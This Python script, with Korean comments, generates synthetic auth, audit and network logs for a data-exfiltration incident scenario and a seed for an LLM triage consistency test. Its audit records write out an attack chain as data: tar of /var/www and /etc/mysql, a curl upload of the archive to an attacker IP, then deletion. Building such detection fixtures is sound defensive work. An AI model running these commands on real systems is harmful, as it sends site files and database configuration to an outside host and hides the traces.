"""데이터 유출(Exfiltration) 시나리오 - 정상 로그인 후 민감 데이터 압축+외부 전송.

*** 2026-09-18 수정: 시간 계산 오류 및 network 방향성 오류 수정 ***
1차 시도에서 EPOCH_BASE를 대충 계산해 넣었더니 실제로는 의도한 시각보다 7시간
넘게 어긋나 있었다 (datetime.fromtimestamp로 역산해서 확인함). 이제 datetime을
직접 써서 정확한 epoch를 계산한다.
또한 network 이벤트의 src_ip/dest_ip를 "웹서버->공격자"로 만들어놓고 정작
fetch_network_log 호출 시 필터는 공격자 IP를 src_ip로 걸었더니 안 걸렸다.
공격자 IP가 dest_ip인 이벤트뿐 아니라 src_ip인 역방향 이벤트도 추가해서,
seed의 src_ip(공격자 IP)가 어느 필드로 오더라도 걸리게 했다.
"""

import os
from datetime import datetime, timezone

LOG_DIR = "sample_logs"
ATTACKER_IP = "91.203.6.44"
VICTIM_USER = "ubuntu"
HOST = "web-01"

# [2026-09-18 수정] 정확한 시각을 datetime으로 명시하고 거기서 epoch를 계산
EVENT_TIME = datetime(2026, 9, 14, 20, 30, 0, tzinfo=timezone.utc)
EPOCH_BASE = int(EVENT_TIME.timestamp())

# ----------------------------------------------------------------------
# 1. auth.log
# ----------------------------------------------------------------------
auth_lines = [
    f"Sep 14 20:30:00 ip-10-0-7-236 sshd[9700]: "
    f"Accepted publickey for {VICTIM_USER} from {ATTACKER_IP} port 44100 ssh2: "
    f"ED25519 SHA256:xJ3kLm9QpR2vNcT8wZa1YbU4EfGhI6oPq7rStUvWxYz",
    f"Sep 14 20:30:00 ip-10-0-7-236 sshd[9700]: pam_unix(sshd:session): "
    f"session opened for user {VICTIM_USER}(uid=1000) by (uid=0)",
]

# ----------------------------------------------------------------------
# 2. audit.log
# ----------------------------------------------------------------------
GS = "\x1d"
SERIAL_BASE = 9700

audit_lines = []


def make_execve_pair(serial, offset_sec, ppid, pid, comm, exe, argv):
    epoch = EPOCH_BASE + offset_sec
    syscall_line = (
        f"type=SYSCALL msg=audit({epoch}.001:{serial}): arch=c000003e syscall=59 "
        f"success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=2 ppid={ppid} pid={pid} "
        f"auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 "
        f"sgid=1000 fsgid=1000 tty=pts0 ses=100 comm=\"{comm}\" exe=\"{exe}\" "
        f"subj=unconfined key=\"exec\""
        f"{GS}ARCH=x86_64 SYSCALL=execve AUID=\"{VICTIM_USER}\" UID=\"{VICTIM_USER}\" "
        f"GID=\"{VICTIM_USER}\" EUID=\"{VICTIM_USER}\" SUID=\"{VICTIM_USER}\" "
        f"FSUID=\"{VICTIM_USER}\" EGID=\"{VICTIM_USER}\" SGID=\"{VICTIM_USER}\" "
        f"FSGID=\"{VICTIM_USER}\""
    )
    argv_fields = " ".join(f'a{i}="{arg}"' for i, arg in enumerate(argv))
    execve_line = f"type=EXECVE msg=audit({epoch}.001:{serial}): argc={len(argv)} {argv_fields}"
    return [syscall_line, execve_line]


audit_lines += make_execve_pair(
    SERIAL_BASE + 1, 5, ppid=9700, pid=9701,
    comm="tar", exe="/usr/bin/tar",
    argv=["tar", "-czf", "/tmp/site_backup.tar.gz", "/var/www/", "/etc/mysql/"],
)
audit_lines += make_execve_pair(
    SERIAL_BASE + 2, 20, ppid=9700, pid=9702,
    comm="curl", exe="/usr/bin/curl",
    argv=["curl", "-T", "/tmp/site_backup.tar.gz", f"http://{ATTACKER_IP}/upload"],
)
audit_lines += make_execve_pair(
    SERIAL_BASE + 3, 45, ppid=9700, pid=9703,
    comm="rm", exe="/usr/bin/rm",
    argv=["rm", "-f", "/tmp/site_backup.tar.gz"],
)

# ----------------------------------------------------------------------
# 3. network.log — [2026-09-18 수정] 양방향 다 기록 (src_ip 필터가 어느 쪽이든 걸리게)
# ----------------------------------------------------------------------
network_lines = [
    # 웹서버 -> 공격자 (실제 방향)
    (
        f'{{"timestamp":"{(EVENT_TIME.replace(second=25)).isoformat().replace("+00:00", ".000000+0000")}",'
        '"event_type":"flow",'
        f'"src_ip":"10.0.7.236","dest_ip":"{ATTACKER_IP}","src_port":48200,'
        '"dest_port":80,"proto":"TCP",'
        '"flow":{"state":"established","bytes_toserver":47185920,"bytes_toclient":1024,'
        '"pkts_toserver":3200,"pkts_toclient":18}}'
    ),
    # 공격자 -> 웹서버 방향으로도 하나 더 (seed의 src_ip 필터가 어느 필드로 오든 걸리도록)
    (
        f'{{"timestamp":"{(EVENT_TIME.replace(second=24)).isoformat().replace("+00:00", ".000000+0000")}",'
        '"event_type":"flow",'
        f'"src_ip":"{ATTACKER_IP}","dest_ip":"10.0.7.236","src_port":80,'
        '"dest_port":48200,"proto":"TCP",'
        '"flow":{"state":"established","bytes_toserver":1024,"bytes_toclient":47185920,'
        '"pkts_toserver":18,"pkts_toclient":3200}}'
    ),
    (
        f'{{"timestamp":"{(EVENT_TIME.replace(second=26)).isoformat().replace("+00:00", ".000000+0000")}",'
        '"event_type":"alert",'
        f'"src_ip":"10.0.7.236","dest_ip":"{ATTACKER_IP}","src_port":48200,'
        '"dest_port":80,"proto":"TCP",'
        '"alert":{"signature":"ET POLICY Large Outbound Data Transfer to Uncategorized Host"}}'
    ),
]

# ----------------------------------------------------------------------
# append
# ----------------------------------------------------------------------
with open(os.path.join(LOG_DIR, "sample_auth.log"), "a", encoding="utf-8") as f:
    f.write("\n" + "\n".join(auth_lines) + "\n")

with open(os.path.join(LOG_DIR, "sample_audit.log"), "a", encoding="utf-8") as f:
    f.write("\n" + "\n".join(audit_lines) + "\n")

with open(os.path.join(LOG_DIR, "sample_network.log"), "a", encoding="utf-8") as f:
    f.write("\n".join(network_lines) + "\n")

print("데이터 유출 시나리오 로그 추가 완료 (시간/방향성 수정판).")
print(f"EPOCH_BASE={EPOCH_BASE} -> {datetime.fromtimestamp(EPOCH_BASE, tz=timezone.utc)}")
print()
print("test_consistency.py의 SEED (incident_id 확인!):")
print(
    f"""
SEED = {{
    "incident_id": "CONSISTENCY-TEST-05",
    "detection_source": "llm_triage",
    "trigger_time": "2026-09-14T20:30:00+00:00",
    "trigger_description": "정상 인증된 SSH 세션에서 민감 디렉터리 압축 및 외부 서버로의 대용량 데이터 전송 발생",
    "confidence_initial": 0.6,
    "severity_hint": "CRITICAL",
    "priority": 1,
    "host": "{HOST}",
    "src_ip": "{ATTACKER_IP}",
    "reasoning": "정상 인증 이후 민감 디렉터리를 압축하고 외부 서버로 대용량 전송한 뒤 흔적을 삭제하려는 정황이 확인되어 데이터 유출 가능성이 높습니다.",
}}
"""
)